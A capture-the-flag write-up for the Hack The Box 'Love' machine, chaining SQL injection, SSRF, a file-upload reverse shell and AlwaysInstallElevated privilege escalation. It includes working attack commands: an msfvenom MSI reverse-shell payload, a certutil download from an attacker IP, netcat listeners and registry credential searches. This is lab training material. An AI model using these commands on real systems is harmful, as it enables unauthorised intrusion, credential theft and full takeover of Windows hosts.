# Love [HTB](https://app.hackthebox.com/machines/344)
![love-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/love-01.png)


## Recon

After adding the target to my `/etc/hosts` file, I fire off an `nmap` scan:

```bash
nmap -sC -sV -A -p- love.htb -oN nmap.result
```

![nmap-res-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/nmap-res-02.png)

![namp-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/nmap-res-03.png)

We have the following:

+ An Apache server on ports 80, 443 & 5000. 
+ An SMB server on port 445.
+ An RPC endpoint mapper on port 135.
+ NetBIOS on port 139.
+ A MariaDB on port 3306.
+ Microsoft HTTPAPI on ports 5985, 5986, 47001.
+ Other RPC related ports at the buttom.


So we have quite a busy target. I think it's best to take a quick look at the SMB server first, 
maybe we can find interesting information there that can help us along the way. After that we can take
a look at the web servers.

An interesting piece of inforamtion I've noticed from the `nmap` scan was the `commonName=staging.love.htb` for the ssl-cert on port 443. We could possiblly have a subdomain hidden somewhere so it's worth to keep in mind. 

Lets take a look at the SMB server.


## SMB Port 445

Trying to connect to the SMB anonymosuly fails:

```bash
smbclient -N -L \\\\love.htb\\
```

Trying the rpc anonymously fails as well:

```bash
rpcclient -U "" -N love.htb
```

![smb-fail-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/smb-fail-04.png)

Seems like anonymous logins are disabled, running tools like `enum4linux`, `crackmapexec` or `smbmap` wont bring us much at this point. Lets move on to the web servers. 


## Apache Port 80

When we open the site at `http://love.htb` we are greeted with a login page:

![site-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/site-05.png)

We dont have credentials at this point, so lets keep looking. I had a look at the source code, 
not much there, lets run a directory and file scan:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://love.htb/FUZZ -e .cgi,.php,.txt,.ps1,.exe,.bak,.sql
```

![ffuf-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/ffuf-06.png)

The scan brought some interesting results, the most of which being the `admin` directory, lets check it out:

![admin-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/admin-07.png)

We are prompted with yet another login page, this time requesting a username instead of a voter-ID. 
If we try the good old `admin:admin` combo, we can see that we also have username information disclosure:

![info-disc-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/info-disc-08.png)

This makes it much easier to brute-force, but before we brute force, lets try to test for SQL injection.
I open `Burp` and i capture a login request. Then i chooce to copy the request to a file:

![login-req-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/login-req-09.png)

Then i use `sqlmap` as such:

```bash
sqlmap -r login.req --batch --tables
```

Which finds a blind SQL injection vulnerability:

![sqli-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/sqli-10.png)

Let's wait for `sqlmap` to enumerate the databases for us:

![databases-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/databases-11.png)

We have 6 databases, the most interesting one to me is the `votesystem` database. Lets wait for the 
table enumeration to see whats inside:

![tables-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/tables-12.png)

We have a few interesting tables, the most important i think is the `admin` table which will probably 
help us get into the admin panel. Lets dump everything from that table:

```bash
sqlmap -r login.req -D votesystem -T admin --dump --batch
```

![admin-table-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/admin-table-13.png)

We have the first and last names, along with a password hash. If we [identify the hash](https://hashes.com/en/tools/hash_identifier) we can see its a `Blowfish` algorithm:

![blowfish-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/blowfish-14.png)

We can use `hashcat` to crack the hash as such:

```bash
hashcat -a 0 -m 3200 '$2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC' /usr/share/wordlists/rockyou.txt
```

Unfortenatly, i wasnt able to crack it, I tried multiple wordlists. So i decided to check the other web services on the target. 


### staging.love.htb


If you recall from the `nmap` scan, the ssl-cert for the HTTPS connection has indicated a subdomain 
of `staging.love.htb`. If we add this subdomain to our `/etc/hosts` file and visit the site we get the following: 

![staging-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/staging-15.png)

If we click on the `Demo` link, we get redirected to a file scanning feature:

![demo-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/demo-16.png)

We can see it asks for a file to scan via URL. At first i thought about a php reverse shell. So i found 
one on [Github](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)
Modified my IP and port info and sent it to the target.

But nothing happened, No indication of succsess or faliure. So i decided to take a look at the source
code of the page:

![source-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/source-17.png)

We have the content of the file as plain text inside the HTML code. The php code gets flaged as an error, because the HTML render engine doesnt recognaize `<?php` as a valid HTML tag. We can conclude from this that, the file scanning feature fetches the contents of remote files, and returns them as plain text in the HTML. 

What if instead of fetching remote files, we can fetch a local file? If you recall from the `nmap` scan, we have a third HTTP service running on port `5000`. And from the `nmap` scan, the title of the page is `403 Forbidden`

What if we sent this file scanning feature to fetch the page from port 5000 for us instead? 
we try this by sending the target to `http://localhost:5000`

![ssrf-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/ssrf-18.png)

And we get the page, which hosts the admin credentials for the voting system panel. What just happened
is a `Server-Side Request Forgery` or ssrf attack. This attack happens when unsanitized user input is 
used to make requests to other resources. Typically the resoucres are internal servers, or API endpoints, but in this case, we used the server to fetch inforamtion from itself to bypass any access control checks.

Now we can log in to the admin panel:

![admin-panel-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/admin-panel-19.png)

If we look at the buttom, we can see this voting system is run by `SourceCodeSter`, if we search Google
for exploits we find this one from [ExploitDB](https://www.exploit-db.com/exploits/49445):

![exploit-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/exploit-20.png)


Looks like the exploit is taking advantage of an image upload feature to uplaod a php reverse shell.

![vote-url-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/vote-url-21.png)

The file upload feature is present when you send the form to add a voter to the system. But we dont 
have this `votesystem` directory, in our scnario, the target runs the votesystem from the root of the web server. So we need to modify it. Then we can invoke the php reverse shell by navigating to `/images/shell.php`, lets give it a shot.


After downloading the expoit make sure to update it:

![update-exploit-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/update-exploit-22.png)

Start the listener:

```bash
rlwrap nc -lnvp 9001
```

Execute the exploit with:

```bash
python3 exploit.py
```

This should give you a shell:

![shell-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/shell-23.png)


## Privilege Escalation


Trying to snatch quick wins by checking for misconfigured privileges with `whoami /priv` doenst work in 
this case. Checking for passwords in the registry with:

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Yields nothing useful. I had a look around the system, i didnt notice unusual software, or any sensetive
files.


If we check the registry for `AlwaysInstallElevated` policy with:

```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

We can see that both entries are enabled:

![policy-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/policy-24.png)


This means that anytime we run an `.msi` installer it runs as the `LocalSystem`. 
Now all we need is some malicious `.msi` to run, lets use `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.61 LPORT=443 -a x64 --platform windows -f msi > shell.msi
```

Now we need to transfer this over to the client. First start a python web server with:

```bash
python3 -m http.server 80
```

Then, from the target download the payload with:

```cmd
certutil -urlcache -f http://10.10.14.61/shell.msi shell.msi
```

Start the listener with:

```bash
rlwrap nc -lnvp 443
```

Execute the `.msi` file on the target with:

```cmd
msiexec /quiet /qn /i shell.msi
```

This should give you system access to the target:

![root-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Love/img/root-25.png)
